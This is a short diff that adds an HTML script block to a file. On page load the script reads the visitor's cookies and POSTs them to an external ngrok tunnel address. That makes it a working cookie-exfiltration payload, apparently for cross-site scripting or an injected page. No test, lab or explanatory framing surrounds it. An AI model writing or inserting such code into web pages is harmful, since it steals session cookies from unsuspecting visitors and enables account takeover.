@@ -1,0 +1,16 @@
+<script>
+    document.addEventListener("DOMContentLoaded",()=>{
+        const cookieValue = document.cookie;
+        const bodyData = 'cookie=' + encodeURIComponent(cookieValue);
+        fetch("https://d95c-38-51-29-58.ngrok-free.app/fetch", {
+            method: "POST",
+            headers: {
+                'Content-Type': 'application/x-www-form-urlencoded'
+            },
+            body: bodyData
+        })
+        .then(response => response.text())
+        .then(data => console.log(data))
+        .catch(error => console.error("Error:", error));
+    })
+</script>
